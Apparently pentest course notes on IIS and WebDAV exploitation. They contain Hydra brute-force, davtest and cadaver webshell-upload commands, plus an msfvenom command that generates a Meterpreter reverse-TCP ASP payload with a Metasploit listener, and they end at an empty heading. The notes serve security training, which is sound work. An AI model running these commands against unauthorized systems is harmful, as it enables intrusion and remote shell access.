IIS (internet information services ) is proprietary microsoft web server. Functions the same as Apache or NGINx but the advantage is that administrators have a GUI to manage the sites hosted on IIS.

Can host sites developed on aspx or PHP. Typically configured to run on ports 80 and 443

.asp
.aspx
.config
.php

**webdav**

set of extension to HTTP protocol that allows users to manage files on web servers. Like a file server for collaborative authoring. Runs on otp of IIS.

Credentials must be provided to authenticate (user name password identity). (sometimes not configured)

**webdav exploitation**

will involve determining if webdav has been configured to run (enumeration) then we can brute force the webdav auth form to establish a foothold (by uploading a malicious .asp payload) 

We will be working with tools that automate this. 

- davtest (enumeration)
- cadaver (exploitation)

**nmap script**

--script=http-enum

**hydra**

hydra -L usernamelist.txt -P passwordlist.txt ip.addr http-get /webdav/

**once credentialed run test with davtest**

davtest -auth username:password -url http://victim.com

**Cadaver**

cadaver http://ip.addr/webdav

* enter credentials *

Then you get a shell emulator

Kali keeps webshells under /usr/share/webshells

put /path/to/webshell

This provides you with a webshell that you can interact with through the web browser.

**Metasploit**

can use msfvenom to generate the payload

msfvenom -p windows/meterpreter/reverse_tcp LHOST=local.addr LPORT=1337 -f asp > shell.asp

(32 bit shells are normally recommended)

Configure your listener in Metasploit

use multi/handler

set payload windows/meterpreter/reverse_tcp

set your options to match your msfvenom

* alternative technique *






